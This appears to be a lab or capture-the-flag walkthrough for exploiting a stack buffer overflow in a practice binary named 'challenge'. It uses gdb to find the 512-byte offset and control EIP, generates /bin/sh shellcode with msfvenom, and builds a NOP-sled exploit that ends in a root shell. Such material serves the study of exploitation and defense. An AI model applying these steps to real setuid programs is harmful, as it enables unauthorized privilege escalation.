#### Step 1:​ Execute the binary.

#### Step 2:​ Analyze the binary with gdb.

Command:​ gdb -q ./challenge

#### Step 3:​ Set the disassembly syntax as intel (optional).

Command:​ set disassembly-flavor intel

#### Step 4:​ Disassemble the main function.

Command:​ disas main

#### Step 5: ​ Disassemble the GetInput function.

Command:​ disas GetInput

#### Step 6:​ Generate a crash by providing a large input.

Command:​ ./challenge $(python -c "print 'A' * 600")

#### Step 7:​ Analyze the crash by overwriting the return address inside gdb.

Set a breakpoint at the last instruction of the GetInput function.

Command:​ break *GetInput +53

Run the binary with the previous input that generated the crash.

Command:​ run $(python -c "print 'A' * 600")

#### Step 8:​ Find the exact payload size that crashes the application. 

Locate the beginning of “A”’s in the stack.

Command:​ x/160x $esp - 0x210

Examine the stack pointer.

Since, the stack pointer holds the return address, 

the exact payload size can be calculated by finding the number of ‘A’ 

till the address of the stack pointer.

Command:​ p/d 0xffffdaec - 0xffffd8ec

#### Step 9:​ Analyze the binary with gdb and adjust the payload to control the instruction pointer.

Set the instruction pointer to “1234”.

Commands: gdb -q ./challenge

run $(python -c "print 'A' * 512 + '1234'")

#### Step 10:​ Generate execve payload using msfvenom.

msfvenom -p linux/x86/exec CMD=/bin/sh AppendExit=true -e x86/alpha_mixed -f python

Note:​ The shellcode generated might be different.

#### Step 11:​ Prepare a python script to generate the required payload to exploit the binary.

Prepend the payload with the nop bytes

#### Step 12:​ Find the nop address.

Open the binary in gdb.

Command:​ gdb -q ./challenge

Unset the LINES and COLUMNS environment variables.

Commands: unset env LINES

unset env COLUMNS

Place a breakpoint on the last instruction of the GetInput function and execute the binary with the exploit payload.

Commands: break *GetInput + 53

run $(python exploit.py)

Find the nop sled in the stack.

Commands: x/x $esp

x/140x $esp-0x200

#### Step 13:​ Choose an address among the nops and set the eip variable to that address in the exploitation script.

Step 14:​ Exploit the binary to get a privileged shell on the system.

Commands: ./challenge $(python exploit.py)

whoami

This would provide a root shell on the system

xD
